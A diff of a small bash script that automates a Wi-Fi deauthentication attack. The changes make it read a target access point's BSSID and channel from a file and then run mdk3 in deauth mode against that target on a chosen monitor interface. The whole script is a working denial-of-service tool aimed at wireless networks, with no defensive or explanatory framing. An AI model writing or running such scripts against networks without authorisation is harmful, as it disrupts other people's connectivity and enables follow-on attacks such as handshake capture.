@@ -1,11 +1,13 @@
 #!/bin/bash
 
-echo ""
-echo "Enter the target's BSSID"
-read -r vBSSID
-echo "Enter the target's channel"
-read -r vChannel
+targetBSSID=$(cat targetList.txt | awk '{print $1}')
+echo "Target BSSID: $targetBSSID"
+targetChannel=$(cat targetList.txt | awk '{print $6}')
+echo "Target Channel: $targetChannel"
+interface=$(cat interfaceToUse.txt)
+echo "Using interface: $interface"
 
-echo $vBSSID > blacklist
+echo $targetBSSID > blacklist
 
-sudo mdk3 wlan1mon d -b blacklist -c 6
+sudo mdk3 $interface d -b blacklist -c $targetChannel 
+#&& PID=$! && sleep(10) && kill -9 $PID
